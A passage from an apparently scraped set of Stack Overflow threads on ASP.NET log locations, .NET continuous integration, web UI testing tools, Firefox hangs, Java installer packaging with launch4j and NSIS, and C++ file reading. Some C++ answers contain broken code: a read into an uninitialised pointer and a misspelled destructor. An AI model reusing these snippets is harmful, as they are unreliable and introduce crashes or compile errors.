<li><a href=""http://msdn.microsoft.com/en-us/library/cc656912.aspx"" rel=""nofollow"">.NET Framework Client Profile (MSDN)</a></li>
</ul>
"
"Where should I put my log file for an asp.net application? <p>I have a ASP.NET application that we've written our own logging module for.</p>

<p>My question is, where is the standard place to write a log file to? I.e. the website will be running as the anonymous user identity (e.g. IUSR on IIS7) and I need a place where I know it'll have permission to write to.</p>

<p>Cheers,</p>
 <p>App_Data folder on the root of the project. It isn't served to web requests; so other people can't snoop for it.</p> <p>I would suggest putting the log file onto a seperate disk, though should give you a little performance gain so that your not trying to both read and write to the same disk as the website. If you cannot put the log file on a seperate disk, then I would simply choose a folder of your choice.</p>

<p>In any case, you will have to give the ""Network Service"" account ""Modify"" permissions to the desired folder.</p>

<p>If on the other hand, you have access to a databse, then log the information there. It will be much quicker than accessing the hard drive and won't be publically available. You'll also be able to report from the data quite easily.</p>
 <p>I'm not in a position to modify the permissions on folders (especially outside of the virtual directory home folder), and don't already have an App_Data folder, so am a bit hesitant to go with that. </p>

<p>So for the moment I'm going with the CommonApplicationData Folder. </p>

<ul>
<li>On Vista/Server 2008 this is C:\ProgramData\</li>
<li>On XP/Server 2003 this is C:\Documents and Settings\All Users\Application Data\</li>
</ul>
 <blockquote>
  <p>I'm not in a position to modify the permissions on folders (especially outside of the virtual directory home folder), and don't already have an App_Data folder, so am a bit hesitant to go with that.</p>
</blockquote>

<p>If you have a website, you clearly have a folder somewhere.  Can you not add a (non-web-facing) subfolder?  It seems like that would be a more appropriate place to put your logs than dumping them into a global, shared folder.</p>
 <p>You could also log to the Windows Event log or to a table in a database.  How often are people looking at the event log?  If it's being examined on a regualr basis, writing to a table amkes the reporting back much easier as it's trivial to reverse the order and only show the last X events for the current time period.  The Windows Event log you can also query the Windows Event Log through <a href=""http://en.wikipedia.org/wiki/Powershell"" rel=""nofollow"" title=""Reading List: Fog Creek Software Management Training Program"">PowerShell</a> or with <a href=""http://www.microsoft.com/downloads/details.aspx?FamilyID=890cd06b-abf8-4c25-91b2-f8d975cf8c07&amp;displaylang=en"" rel=""nofollow"" title=""Bootstrap"">LogParser</a>.</p>
 <p>Push the app_data is the best idea, just bear in mind, when the publishing the projects, if the option ""Delete all existing files before publishing"" is ticked, then the current data in the folder will be gone. The workaround is to skip the deletion of app_data folder. </p>

<p>Another option to do logging is to use some existing framework such as Log4net. </p>
"
"Setting up Continuous Integration with SVN <p>What tools would you recommend for setting up CI for build and deployment of multiple websites built on DotNetNuke using SVN for source control? </p>

<p>We are currently looking at configuring Cruise Control to work with NAnt, NUnit, NCover and Trac as a test case. What other combinations would worth investigating?</p>

<p>We have full control of our development environment so using some form of CI is certain here but I would also like to convince our production services team that they can reliably deploy to the system test, uat and even production environments using these tools.</p>
 <p>I would have a look at Team City <a href=""http://www.jetbrains.com/teamcity/index.html"" rel=""nofollow"">http://www.jetbrains.com/teamcity/index.html</a>
I know some people who are looking in to this and they say good things about it.</p>

<p>My companies build process is done in FinalBuilder so I'm going to be looking at their server soon.</p>

<p>CC is quite good in that you can have one CC server monitor another CC server so you could set up stuff like - when a build completes on your build server, your test server would wake up, boot up a virtual machine and deploy your application.  Stuff like that.</p>
 <p>We use CruiseControl with NUnit, NCover, FxCop, SVN and some custom tools we wrote ourselves to produce the reports. In my opinion it has proven (over the last few years) to be an excellent combination.</p>

<p>It's frustrating that MS restricts <em>all</em> of its integration tools to VSTS.  Its test framework is as good as NUnit, but you can't use its code coverage tools or anything else.</p>

<p>I'd check out XNuit - it's looking pretty promising (but currently lacking UI).</p>

<p>We automate nightly builds, and you could automate UAT and manual test builds, but I'm not sure that we'd ever want to automate the release to our production servers. Even if it were any change would be important enough that someone would have to watch over it anyway.</p>
 <p>Microsoft loosened it's constraint on the Testing Platform by including it in Visual Studio 2008 Professional and allowing for the tests to be run from the command line with Framework 3.5 installed. We did a crossover for a client recently and so far they have been able to run all the tests without the need for NUnit.</p>
 <p>We use CruiseControl.NET running msbuild scripts. Msbuild is responsible for updating from SVN on every commit, compiling, and running FxCop and NCover/NUnit.</p>
 <p>Take a look at <a href=""http://hudson-ci.org/"" rel=""nofollow"">Hudson</a>. It's highly customizable, and, IMHO, easier than CruiseControl.</p>
 <p>I would recommend you take a look at NAnt + NUnit ( + NCover) + TeamCity with SVN for your build system. There is actually a very nice article describing this configuration at <a href=""http://www.acceptedeclectic.com/2008/05/visualsvn-teamcity-nant-sql-server.html"" rel=""nofollow"">Pete W's idea book</a> (Sorry, this link doesn't exist anymore!)</p>
"
"What do you use to Unit-Test your Web UI? <p>The company I'm currently working for is using <a href=""http://selenium.openqa.org/"">Selenium</a> for Uniting-Testing our User Interface. What do you use to Unit-Test your Web UI and how effective do you find it? </p>
 <p>We use Selenium Core, but are switching gradually to Selenium RC which is much nicer and easier to manage. We have written lots of custom code to make the tests run on our Continuous Integration servers, some of them in parallel suites to run faster. </p>

<p>One thing you'll find is that Selenium seems to restart the browser for each test (you can set it not to do this, but we got memory problems when we did that). This can be slow in Firefox, but is not too bad in IE (one time I'm thankful for Bill Gates's OS integraion).</p>
 <p>We are using QuickTestPro.  So far it is effective, but the browser selection is limited.  The nicest part is the ability to record your browser's activity, and convert it into a scriptable set of steps.  There is also a nice .Net addin so if you have any validation code you need to do for the different stages of your test, you can write methods in an assembly and call them from your script.</p>
 <p>Well, if you've designed your application properly, you won't have scads of logic inside the UI anyway. It makes much more sense to separate the actual work getting done into units separate from the UI, and then test those. </p>

<p>If you do that, then the only code in the UI will be code that invokes the backend, so simply testing the backend is sufficient.</p>

<p>I have used NUnit ASP in the past (at my job), and if you insist on unit testing your UI, I would strongly advise you to use ANYTHING but NUnit ASP. It's a pain to work with, and tests tend to be invalidated (needing to be revised) after even the most minor UI changes (even if the subjects of the tests don't actually change).</p>
 <p>We have been using <a href=""https://github.com/pivotal/jsunit"" rel=""nofollow"">JSunit</a> for a while to do unit tests... it may not be the same kinds of tests you are talking about, but it is great for ensuring your JavaScript works as you expect.</p>

<p>You run it in the browser, and it can be set in an Ant build to be automatically run against a bunch of browsers on a bunch of platforms remotely (so you can ensure your code is cross-browser as well as ensure the logic is correct).</p>

<p>I don't think it replaces Selenium, but it complements it well.</p>
 <p>We use <a href=""http://watin.sourceforge.net/"">Watin</a> at my place of employment, we are a .net shop so this solution made a lot of sense.  We actually started with Watir (the original ruby implementation) and switched after.  It's been a pretty good solution for us so far</p>
 <p>I've used <a href=""http://wtr.rubyforge.org/"" rel=""nofollow"">WATIR</a>, which is pretty good. I liked it because it's Ruby and allows for testing interactivity, available elements and source code parsing. I haven't used it for a while but I assume it's gotten better.</p>

<p>It's supposedly being ported to Firefox and Safari, but that's been happening for a while now.</p>
 <p>Check out <a href=""http://webtest.canoo.com/webtest/manual/WebTestHome.html"" rel=""nofollow"">Canoo Web Test</a>.  It is open source and built on the ANT framework.</p>

<p>I spent some time working with it for a graduate course on Software QA and it seems to be a pretty powerful testing tool.</p>
 <p><a href=""http://selenium-grid.openqa.org/"" rel=""nofollow"">Selenium Grid</a> can run your web tests across multiple machines in parallel, which can speed up the web testing process</p>
 <p>I mostly use <a href=""http://cubictest.openqa.org"" rel=""nofollow"">CubicTest</a>, which is an eclipse plugin that lets you define tests graphically. It can export/run tests through several libraries, including watir and selenium. Most people just use the Selenium runner though.</p>

<p>Full disclosure: I'm one of the developers, so I'm kind of biased :)</p>

<p>Take a closer look here: <a href=""http://cubictest.openqa.org/"" rel=""nofollow"">cubictest.openqa.org</a></p>

<p>-Erlend</p>
 <p>Selenium is for Integration testing, not Unit testing. It's a subtle, but important difference. The usage I usually see is for sanity checking a build. i.e., have a test that logs in, a test that (for example) submits a story, makes a comment, etc.</p>

<p>The idea is that you're testing to see if the whole system is working together before deployment, rather than have a user discover that your site is broken.</p>
 <p>I'm a huge fan of Selenium. Saying 'unit-testing your web ui' isn't exactly accurate as some of the comments have mentioned. However, I do find Selenium to be incredibly useful for performing those sort of acceptance and sanity tests on the UI.</p>

<p>A good way to get started is using Selenium IDE as part of your development. Ie, just have the IDE open as you're developing and write your test as you go to cut down on your dev time. (Instead of having to manually go through the UI to get to the point where you can test whatever you're working on, just hit a button and Selenium IDE will take care of that for you. It's a terrific time-saver!)</p>

<p>Most of my major use case scenarios have Selenium RC tests to back them up. You can't really think of them as unit-tests along the lines of an xUnit framework, but they are tests targetted to very specific functionality. They're quick to write (especially if you implement common methods for things like logging in or setting up your test cases), quick to run, and provide a very tight feedback loop. In those senses Selenium RC tests are very <em>similar</em> to unit-tests.</p>

<p>I think, like anything else, if you put the effort into properly learning a test tool (eg, Selenium), your effort will pay off in spades. You mention that your company already uses Selenium to do UI testing. This is great. Work with it. If you find Selenium hard to use, or confusing, stick with it. The learning curve really isn't all that steep once you learn the API a little bit.</p>

<p>If I'm working on a web app, its rare for me to write a significant amount of code without Selenium RC tests to back it up. That's how effective I find Selenium. :) (Hopefully that'll answer your question..)</p>
 <p>We use Visual Studio 2008 Tester Edition. </p>

<p><strong>Pros:</strong>
Very good at capturing user interaction</p>

<p>Captures Ajax calls</p>

<p>It is very easy to map user input to a database, XML or CSV file</p>

<p>The captured test can be converted to C# for more control</p>

<p>The same tests can be used for load testing and code coverage</p>

<p><strong>Cons:</strong></p>

<p>VS2008 Tester Edition is a seperate SKU from the normal Developer Edition, which means extra cost</p>

<p>You may be alergic to Microsoft ;-)</p>

<p>We have used it very effectively on projects, however there a lot of effort involved in keeping tests up to date, every time you change a screen the test may need to be re-recorded</p>

<p>We tend to keep the tests short and sharp, do one thing and get out instead of recording 10 minutes worth of clicking around in a single test.</p>

<p><strong>We have a few standard UI test types:</strong></p>

<p><strong>Menu Test:</strong> Log in as a specific user (or user type/role) and make sure all the required menu items are available</p>

<p><strong>Validation Test:</strong> Open a page and click save without entering any data, ensure that all the validation warnings appear. Complete required fields one at a time and check that the warning messages disappear when they are supposed to.</p>

<p><strong>Search Test:</strong> Search using data from your database or a data file and ensure the correct data is returned by the search</p>

<p><strong>Data Entry Test:</strong> Create new recrords from a data file, cleanup the database to allow tests to run multiple times</p>

<p>UI Testing is quite time consuming but the comfort feeling you get when a few hundred tests pass before you release a new version is priceless.</p>
 <p>We use <a href=""http://watin.sourceforge.net/"" rel=""nofollow"">WatiN</a> for system testing, and <a href=""http://docs.jquery.com/QUnit"" rel=""nofollow"">QUnit</a> for JavaScript unit testing.</p>
 <p><a href=""http://www.molyb.org/confluence/display/molyb/Home"" rel=""nofollow"" title=""Molybdenum"">Molybdenum</a> is built over Selenium and has some additional features.</p>
 <p>We currently use <a href=""http://microfocus.com/products/silk/silktest/index.aspx"" rel=""nofollow"">Silk4J</a> - a Java centric approach to testing Web UI. It can test Flash, Flex, AIR, Silver Light, Win32, HTML, and a few other applications.</p>

<p>Since Silk4J can control Win32 apps it can control browser dialogs directly, which is a step above what Selenium can control and is especially useful for download prompts.</p>
"
"Some kind of task manager for JavaScript in Firefox 3? <p>Recently I have been having issues with Firefox 3 on Ubuntu Hardy Heron.</p>

<p>I will click on a link and it will hang for a while.  I don't know if its a bug in Firefox 3 or a page running too much client side JavaScript, but I would like to try and debug it a bit.</p>

<p>So, my question is ""is there a way to have some kind of process explorer, or task manager sort of thing for Firefox 3?""</p>

<p>I would like to be able to see what tabs are using what percent of my processor via the JavaScript on that page (or anything in the page that is causing CPU/memory usage).  </p>

<p>Does anybody know of a plugin that does this, or something similar?  Has anyone else done this kind of inspection another way?</p>

<p>I know about FireBug, but I can't imagine how I would use it to finger which tab is using a lot of resources.</p>

<p>Any suggestions or insights?</p>
 <p>It's probably the <a href=""http://shaver.off.net/diary/2008/05/25/fsyncers-and-curveballs/"" rel=""nofollow"">awesome firefox3 fsync ""bug""</a>, which is a giant pile of fail.</p>

<p>In summary</p>

<ul>
<li>Firefox3 saves its bookmarks and history in an SQLite database</li>
<li>Every time you load a page it writes to this database several times</li>
<li>SQLite cares deeply that you don't lose your bookmarks, so each time it writes, instructs the kernel to flush it's database file to disk and ensure that it's fully written</li>
<li>Many variants of linux, when told to flush like that, flush EVERY FILE. This may take up to a minute or more if you have background tasks doing any kind of disk intensive stuff.</li>
<li>The kernel makes firefox wait while this flush happens, which locks up the UI.</li>
</ul>
 <p>There's no ""process explorer"" kind of tool for Firefox; but there's <a href=""http://developer.mozilla.org/en/docs/Venkman"" rel=""nofollow"">http://developer.mozilla.org/en/docs/Venkman</a> with profiling mode, which you could use to see the time spent by chrome (meaning non-content, that is not web-page) scripts.</p>

<p>From what I've read about it, DTrace might also be useful for this sort of thing, but it requires creating a custom build and possibly adding additional probes to the source. I haven't played with it myself yet.</p>
 <p>There's a <a href=""http://shaver.off.net/diary/2008/05/25/fsyncers-and-curveballs/"" rel=""nofollow"">thorough discussion of this</a> that explains all of the fsync related problems that affected pre-3.0 versions of FF.  In general, I have not seen the behaviour since then either, and really it shouldn't be a problem at all if your system isn't also doing IO intensive tasks.  Firebug/Venkman make for nice debuggers, but they would be painful for figuring out these kinds of problems for someone else's code, IMO.</p>

<p>I also wish that there was an easy way to look at CPU utilization in Firefox by tab, though, as I often find myself with FF eating 100% CPU, but no clue which part is causing the problem.</p>
 <blockquote>
  <p>So, my question is, is there a way to have some kind of process explorer, or task manager sort of thing for Firefox 3?</p>
</blockquote>

<p>Because of the way Firefox is built this is not possible at the moment. But the new Internet Explorer 8 Beta 2 and the just announced Google Chrome browser are heading in that direction, so I suppose Firefox will be heading there too.</p>

<p>Here is a post (<a href=""http://ejohn.org/blog/google-chrome-process-manager/"" rel=""nofollow"">  Google Chrome Process Manager </a> ),by John Resig from Mozilla and jQuery fame on the subject.</p>
 <p><a href=""https://addons.mozilla.org/en-US/firefox/addon/9954"" rel=""nofollow"">XUL Profiler</a> is an awesome extension that can point out extensions and client side JS gone bananas CPU-wise. It does not work on a per-tab basis, but per-script (or so). You can normally relate those .js scripts to your tabs or extensions by hand.</p>

<p>It is also worth mentioning that Google Chrome has built-in a really good task manager that gives memory and CPU usage per tab, extension and plugin.</p>

<blockquote>
  <p>[XUL Profiler] is a Javascript profiler. It
  shows elapsed time in each method as a
  graph, as well as browser canvas zones
  redraws to help track down consuming
  CPU chunks of code.</p>
  
  <p>Traces all JS calls and paint events
  in XUL and pages context. Builds an
  animation showing dynamically the
  canvas zones being redrawn.</p>
</blockquote>

<p>As of FF 3.6.10 it is not up to date in that it is not marked as compatible anymore. But it still works and you can override the incompatibility with the equally awesome <a href=""https://addons.mozilla.org/en-US/firefox/addon/mr-tech-toolkit/"" rel=""nofollow"" title=""MR Tech Toolkit extension"">MR Tech Toolkit extension</a>.</p>
"
"Packaging Java apps for the Windows/Linux desktop <p>I am writing an application in Java for the desktop using the Eclipse SWT library for GUI rendering.  I think SWT helps Java get over the biggest hurdle for acceptance on the desktop: namely providing a Java application with a consistent, responsive interface that looks like that belonging to any other app on your desktop.  However, I feel that packaging an application is still an issue.  </p>

<p>OS X natively provides an easy mechanism for wrapping Java apps in native application bundles, but producing an app for Windows/Linux that doesn't require the user to run an ugly batch file or click on a .jar is still a hassle.  Possibly that's not such an issue on Linux, where the user is likely to be a little more tech-savvy, but on Windows I'd like to have a regular .exe for him/her to run.</p>

<p>Has anyone had any experience with any of the .exe generation tools for Java that are out there?  I've tried JSmooth but had various issues with it.  Is there a better solution before I crack out Visual Studio and roll my own?</p>

<p><strong>Edit:</strong>  I should perhaps mention that I am unable to spend a lot of money on a commercial solution.</p>
 <p><a href=""http://www.ej-technologies.com/products/install4j/overview.html"" rel=""nofollow"" title=""Power-Coder"">Install4J</a>. Not free, but worth it. Give the trial a shot</p>
 <p>I went through the same and found that all of the free options weren't very good. Looks like you'll be writing your own. I'd be interested to see if someone has a free/cheap option that works</p>
 <p>Have you thought about <a href=""http://java.sun.com/javase/technologies/desktop/javawebstart/index.jsp"" rel=""nofollow"" title=""Presentation Zen"">Java Web Start</a>?  <a href=""http://www.ibm.com/developerworks/opensource/library/os-jws/"" rel=""nofollow"" title=""Presentation Zen book"">Here</a> is a tutorial specifically for deploying an SWT application with Java Web Start.</p>
 <p>Maybe you should take a look at <a href=""http://izpack.org/"" rel=""nofollow"" title=""for Visual Studio 2005"">IzPack</a>. I created a very nice installer some years ago and I'd bet that they are still improving it. It allows the installation of docs, binaries and a clickable link to start the application <em>IIRC</em>.</p>
 <p>Have you considered writing a small program in C/C++ that just calls <a href=""http://msdn.microsoft.com/en-us/library/ms682425.aspx"" rel=""nofollow""><code>CreateProcess</code></a> to start up the java VM with the jar (or class) file?</p>

<p>You could get <a href=""http://www.microsoft.com/express/vc/"" rel=""nofollow"">Visual C++ Express</a> and put together the startup program pretty easily.  This would make it easy to add a friendly icon as well.</p>
 <p>Another option I was considering: rather than writing a native launcher from scratch, Eclipse comes with the source code for its own launcher, and this could perhaps be repurposed for my app.</p>

<p>It's a shame that Sun never included anything similar in the JDK.</p>
 <p>I've used the free <a href=""http://launch4j.sourceforge.net/"" rel=""nofollow"">Launch4J</a> to create a custom launcher for my Java programs on Windows. Combined with the free <a href=""http://nsis.sourceforge.net/Main_Page"" rel=""nofollow"">NSIS Installer</a> you can build a nice package for your Windows users.</p>

<p><strong>Edit:</strong> Did not see that you use SWT. Don't know if it works with SWT as well, because I used only Swing in my apps.</p>
 <p>In my company we use <a href=""http://launch4j.sourceforge.net/"">Launch4J</a> to create the exe file, and <a href=""http://nsis.sourceforge.net/"">NSIS</a> to create the installer, with SWT applications. </p>

<p>We have used it for years in several commercial applications and the pair works fine.</p>
 <p>Another vote for Launch4J, just wrote an ant task this morning to integrate with one of my projects.  Seems to work really well</p>
 <p>Consider converting your application to <a href=""http://wiki.eclipse.org/index.php/Rich_Client_Platform"" rel=""nofollow"">Eclipse RCP</a>.  It is written in <a href=""http://eclipse.org/swt"" rel=""nofollow"">SWT</a>, and the Eclipse IDE contains packaging tools that generate executables for all major platforms.  For windows, it can generate a zip or a folder containing your code.  For a common installation experience, I'd using NSIS.  There is actually a <a href=""http://wiki.eclipse.org/Eclipse_RCP_Installer/Packages_Generator"" rel=""nofollow"">packages generator</a> project at eclipse to create common installers for all platforms eclipse supports.</p>
 <p>To follow up on pauxu's answer, I'm using launch4j and NSIS on a project of mine and thought it would be helpful to show just how I'm using them.  Here's what I'm doing for Windows.  BTW, I'm creating .app and .dmg for Mac, but haven't figured out what to do for Linux yet.</p>

<h2>Project Copies of launch4j and NSIS</h2>

<p>In my project I have a ""vendor"" directory and underneath it I have a directory for ""launch4j"" and ""nsis"".  Within each is a copy of the install for each application.  I find it easier to have a copy local to the project rather than forcing others to install both products and set up some kind of environment variable to point to each.</p>

<h2>Script Files</h2>

<p>I also have a ""scripts"" directory in my project that holds various configuration/script files for my project.  First there is the launch4j.xml file:</p>

<pre><code>&lt;launch4jConfig&gt;
  &lt;dontWrapJar&gt;true&lt;/dontWrapJar&gt;
  &lt;headerType&gt;gui&lt;/headerType&gt;
  &lt;jar&gt;rpgam.jar&lt;/jar&gt;
  &lt;outfile&gt;rpgam.exe&lt;/outfile&gt;
  &lt;errTitle&gt;&lt;/errTitle&gt;
  &lt;cmdLine&gt;&lt;/cmdLine&gt;
  &lt;chdir&gt;.&lt;/chdir&gt;
  &lt;priority&gt;normal&lt;/priority&gt;
  &lt;downloadUrl&gt;http://www.rpgaudiomixer.com/&lt;/downloadUrl&gt;
  &lt;supportUrl&gt;&lt;/supportUrl&gt;
  &lt;customProcName&gt;false&lt;/customProcName&gt;
  &lt;stayAlive&gt;false&lt;/stayAlive&gt;
  &lt;manifest&gt;&lt;/manifest&gt;
  &lt;icon&gt;&lt;/icon&gt;
  &lt;jre&gt;
    &lt;path&gt;&lt;/path&gt;
    &lt;minVersion&gt;1.5.0&lt;/minVersion&gt;
    &lt;maxVersion&gt;&lt;/maxVersion&gt;
    &lt;jdkPreference&gt;preferJre&lt;/jdkPreference&gt;
  &lt;/jre&gt;
  &lt;splash&gt;
    &lt;file&gt;..\images\splash.bmp&lt;/file&gt;
    &lt;waitForWindow&gt;true&lt;/waitForWindow&gt;
    &lt;timeout&gt;60&lt;/timeout&gt;
    &lt;timeoutErr&gt;true&lt;/timeoutErr&gt;
  &lt;/splash&gt;
&lt;/launch4jConfig&gt;
</code></pre>

<p>And then there's the NSIS script rpgam-setup.nsis.  It can take a VERSION argument to help name the file.</p>

<pre><code>; The name of the installer
Name ""RPG Audio Mixer""

!ifndef VERSION
    !define VERSION A.B.C
!endif

; The file to write
outfile ""..\dist\installers\windows\rpgam-${VERSION}.exe""

; The default installation directory
InstallDir ""$PROGRAMFILES\RPG Audio Mixer""

; Registry key to check for directory (so if you install again, it will 
; overwrite the old one automatically)
InstallDirRegKey HKLM ""Software\RPG_Audio_Mixer"" ""Install_Dir""

# create a default section.
section ""RPG Audio Mixer""

    SectionIn RO

    ; Set output path to the installation directory.
    SetOutPath $INSTDIR
    File /r ""..\dist\layout\windows\""

    ; Write the installation path into the registry
    WriteRegStr HKLM SOFTWARE\RPG_Audio_Mixer ""Install_Dir"" ""$INSTDIR""

    ; Write the uninstall keys for Windows
    WriteRegStr HKLM ""Software\Microsoft\Windows\CurrentVersion\Uninstall\RPGAudioMixer"" ""DisplayName"" ""RPG Audio Mixer""
    WriteRegStr HKLM ""Software\Microsoft\Windows\CurrentVersion\Uninstall\RPGAudioMixer"" ""UninstallString"" '""$INSTDIR\uninstall.exe""'
    WriteRegDWORD HKLM ""Software\Microsoft\Windows\CurrentVersion\Uninstall\RPGAudioMixer"" ""NoModify"" 1
    WriteRegDWORD HKLM ""Software\Microsoft\Windows\CurrentVersion\Uninstall\RPGAudioMixer"" ""NoRepair"" 1
    WriteUninstaller ""uninstall.exe""

    ; read the value from the registry into the $0 register
    ;readRegStr $0 HKLM ""SOFTWARE\JavaSoft\Java Runtime Environment"" CurrentVersion

    ; print the results in a popup message box
    ;messageBox MB_OK ""version: $0""

sectionEnd

Section ""Start Menu Shortcuts""
  CreateDirectory ""$SMPROGRAMS\RPG Audio Mixer""
  CreateShortCut ""$SMPROGRAMS\RPG Audio Mixer\Uninstall.lnk"" ""$INSTDIR\uninstall.exe"" """" ""$INSTDIR\uninstall.exe"" 0
  CreateShortCut ""$SMPROGRAMS\RPG AUdio Mixer\RPG Audio Mixer.lnk"" ""$INSTDIR\rpgam.exe"" """" ""$INSTDIR\rpgam.exe"" 0
SectionEnd

Section ""Uninstall""

    ; Remove registry keys
    DeleteRegKey HKLM ""Software\Microsoft\Windows\CurrentVersion\Uninstall\RPGAudioMixer""
    DeleteRegKey HKLM SOFTWARE\RPG_Audio_Mixer

    ; Remove files and uninstaller
    Delete $INSTDIR\rpgam.exe
    Delete $INSTDIR\uninstall.exe

    ; Remove shortcuts, if any
    Delete ""$SMPROGRAMS\RPG Audio Mixer\*.*""

    ; Remove directories used
    RMDir ""$SMPROGRAMS\RPG Audio Mixer""
    RMDir ""$INSTDIR""

SectionEnd
</code></pre>

<h2>Ant Integration</h2>

<p>I have some targets in my Ant buildfile (build.xml) to handle the above.  First I tel Ant to import launch4j's Ant tasks:</p>

<pre><code>&lt;property name=""launch4j.dir"" location=""vendor/launch4j"" /&gt;
&lt;taskdef name=""launch4j"" 
    classname=""net.sf.launch4j.ant.Launch4jTask""
    classpath=""${launch4j.dir}/launch4j.jar:${launch4j.dir}/lib/xstream.jar"" /&gt;
</code></pre>

<p>I then have a simple target for creating the wrapper executable:</p>

<pre><code>&lt;target name=""executable-windows"" depends=""jar"" description=""Create Windows executable (EXE)""&gt;
    &lt;launch4j configFile=""scripts/launch4j.xml"" outfile=""${exeFile}"" /&gt;
&lt;/target&gt;
</code></pre>

<p>And another target for making the installer:</p>

<pre><code>&lt;target name=""installer-windows"" depends=""executable-windows"" description=""Create the installer for Windows (EXE)""&gt;
    &lt;!-- Lay out files needed for building the installer --&gt;
    &lt;mkdir dir=""${windowsLayoutDirectory}"" /&gt;
    &lt;copy file=""${jarFile}"" todir=""${windowsLayoutDirectory}"" /&gt;
    &lt;copy todir=""${windowsLayoutDirectory}/lib""&gt;
        &lt;fileset dir=""${libraryDirectory}"" /&gt;
        &lt;fileset dir=""${windowsLibraryDirectory}"" /&gt;
    &lt;/copy&gt;
    &lt;copy todir=""${windowsLayoutDirectory}/icons""&gt;
         &lt;fileset dir=""${iconsDirectory}"" /&gt;
    &lt;/copy&gt;
    &lt;copy todir=""${windowsLayoutDirectory}"" file=""${exeFile}"" /&gt;

    &lt;mkdir dir=""${windowsInstallerDirectory}"" /&gt;

    &lt;!-- Build the installer using NSIS --&gt;
    &lt;exec executable=""vendor/nsis/makensis.exe""&gt;
        &lt;arg value=""/DVERSION=${version}"" /&gt;
        &lt;arg value=""scripts/rpgam-setup.nsi"" /&gt;
    &lt;/exec&gt;
&lt;/target&gt;
</code></pre>

<p>The top portion of that just copies the necessary files for the installer to a temporary location and the second half executes the script that uses all of it to make the installer.</p>
 <p>I have used JSmooth in the past, and still have luck with it.  The UI is pretty buggy, but I only use that for building the config file once, and then I build from Ant after that.</p>

<p>What issues are you having with JSmooth?</p>
 <p>JSMooth has worked very well for us in a production environment, where I first generated a single jar using one-jar (fat jar plugin to eclipse) and then wrapped it with JSmooth.</p>

<p>(Please note that I wanted a no-install distribution of a single file, which could promt for installing the JRE if needed).</p>

<p>It has worked so well that I thought nobody was using it :)</p>
 <p>You may want to try our tool, <a href=""http://bitrock.com"" rel=""nofollow"">BitRock InstallBuilder</a>. Although it is a native application, a lot of our customers use it to package desktop Java applications. If you bundle the JRE and create launcher, etc. the user does not even need to know they are installing a Java application. It is cross platform, so you can generate installers for both Windows and Mac (and Linux, Solaris, etc.) Like install4j tool mentioned in another post, it is a commercial tool, <em>but</em> we have free licenses for open source projects and special discounts for microISVs / small business, etc. just drop us an email.  Also wanted to emphasize that this is an installer tool, so it will not address your needs if you are looking only for a single file executable.</p>
 <p>In my company we use launch4J and NSIS for the windows distribution, and jdeb for the Debian distribution, and Java Web Start for the general operating system. This works quite fine.</p>
 <p>Please try <a href=""http://www.installjammer.com/"" rel=""nofollow"">InstallJammer</a>.The best one I have used ever. Free and powerful.And sufficient for personal and commercial use.</p>
 <p>You can now do this through Netbeans! It's really easy and works perfectly. Check out <a href=""https://netbeans.org/kb/docs/java/native_pkg.html"" rel=""nofollow"">this</a> tutorial on the Netbeans website.</p>
 <p>Have you considered Advanced Installer?<br/><br/>
I have used it severally especially for Windows and Mac. No scripting or Ant required. All GUI. Very simple and understandable. Ain't free but worth every penny.<br/><br/>
- Lauch as Administrator<br/>
- File Association<br/>
- Custom Install Themes + In built Themes<br/>
- Package with JRE<br/>
- Install location<br/>
- Native Splash screen implementation<br/>
- You can event create services and installation events<br/>
- Prerequisites<br/>
- JRE minimum version and maximum version<br/><br/></p>

<p>And a lot more. And don't get it twisted, i have no connections with the dudes...their App is just awesome.</p>
"
"How do you open a file in C++? <p>I want to open a file for reading, the C++ way. I need to be able to do it for:</p>

<ul>
<li><p>text files, which would involve some sort of read line function.</p></li>
<li><p>binary files, which would provide a way to read raw data into a <code>char*</code> buffer.</p></li>
</ul>
 <p>There are three ways to do this, depending on your needs. You could use the old-school C way and call fopen/fread/fclose, or you could use the C++ fstream facilities (ifstream/ofstream), or if you're using MFC, use the CFile class, which provides functions to accomplish actual file operations.</p>

<p>All of these are suitable for both text and binary, though none have a specific readline functionality. What you'd most likely do instead in that case is use the fstream classes (fstream.h) and use the stream operators (&lt;&lt; and >>) or the read function to read/write blocks of text:</p>

<pre><code>int nsize = 10;
char *somedata;
ifstream myfile;
myfile.open(""&lt;path to file&gt;"");
myfile.read(somedata,nsize);
myfile.close();
</code></pre>

<p>Note that, if you're using Visual Studio 2005 or higher, traditional fstream may not be available (there's a new Microsoft implementation, which is slightly different, but accomplishes the same thing).</p>
 <p>You need to use an <a href=""http://en.cppreference.com/w/cpp/io/basic_ifstream""><code>ifstream</code></a> if you just want to read (use an <code>ofstream</code> to write, or an <code>fstream</code> for both).</p>

<p>To open a file in text mode, do the following:</p>

<pre><code>ifstream in(""filename.ext"", ios_base::in); // the in flag is optional
</code></pre>

<p>To open a file in binary mode, you just need to add the ""binary"" flag.</p>

<pre><code>ifstream in2(""filename2.ext"", ios_base::in | ios_base::binary ); 
</code></pre>

<p>Use the <a href=""http://en.cppreference.com/w/cpp/io/basic_istream/read""><code>ifstream.read()</code></a> function to read a block of characters (in binary or text mode).  Use the <a href=""http://en.cppreference.com/w/cpp/string/basic_string/getline""><code>getline()</code></a> function (it's global) to read an entire line.</p>
 <p>fstream are great but I will go a little deeper and tell you about <a href=""http://en.wikipedia.org/wiki/Resource_Acquisition_Is_Initialization"" rel=""nofollow"">RAII</a>.</p>

<p>The problem with a classic example is that you are forced to close the file by yourself, meaning that you will have to bend your architecture to this need. RAII makes use of the automatic destructor call in C++ to close the file for you.</p>

<p><strong>Update</strong>: seems that std::fstream already implements RAII so the code below is useless. I'll keep it here for posterity and as an example of RAII. </p>

<pre><code>class FileOpener
{
public:
    FileOpener(std::fstream&amp; file, const char* fileName): m_file(file)
    { 
        m_file.open(fileName); 
    }
    ~FileOpeneer()
    { 
        file.close(); 
    }

private:
    std::fstream&amp; m_file;
};
</code></pre>

<p>You can now use this class in your code like this:</p>

<pre><code>int nsize = 10;
char *somedata;
ifstream myfile;
FileOpener opener(myfile, ""&lt;path to file&gt;"");
myfile.read(somedata,nsize);
// myfile is closed automatically when opener destructor is called
</code></pre>

<p>Learning how RAII works can save you some headaches and some major memory management bugs.</p>
 <pre><code>#include &lt;iostream&gt;
#include &lt;fstream&gt;
using namespace std;

void main()
{
    ifstream in_stream; // fstream command to initiate ""in_stream"" as a command.
    char filename[31]; // variable for ""filename"".
    cout &lt;&lt; ""Enter file name to open :: ""; // asks user for input for ""filename"".
    cin.getline(filename, 30); // this gets the line from input for ""filename"".
